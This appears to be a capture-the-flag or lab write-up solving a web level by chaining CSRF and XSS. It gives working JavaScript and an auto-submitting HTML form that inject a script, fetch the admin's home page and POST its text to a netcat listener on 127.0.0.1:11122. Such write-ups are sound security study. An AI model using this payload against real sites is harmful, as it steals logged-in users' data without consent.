This level requires us to fetch the home website of the user `admin` through a CSRF attack and send the text back to our `netcat` server. This means we'll need to make 2 requests, 1st request is to get the home page, 2nd request is to send the home page to the `netcat` server. Fortunately, The `fetch` API has the `then` method, which allows us to essentially pipe the output of a `fetch` to another `fetch`.

Let's construct our XSS script first:

```javascript
fetch("http://challenge.localhost:80")
	.then(response => {
		return response.text()
	})
	.then(content => {
		fetch("http://127.0.0.1:11122", {
			method:"POST",
			headers:{"Content-Type":"text/plain"},
			body:content
		})
	})
```

We make a GET request to the home page at `http://challenge.localhost:80` first, then after we get a response, we make a new request to `http://127.0.0.1:11122` with the output of the previous GET request (with the appropriate text header since we converted our response to text and we only need text since we're gonna view it in a terminal).

Now let's embed this into our XSS payload.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form method="GET" action="http://challenge.localhost/ephemeral">
<input type="hidden" name="msg" value='<script>fetch("http://challenge.localhost:80").then(response => {return response.text()}).then(content => {fetch("http://127.0.0.1:11122", {method:"POST", headers:{"Content-Type":"text/plain"}, body:content})})</script>'>
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```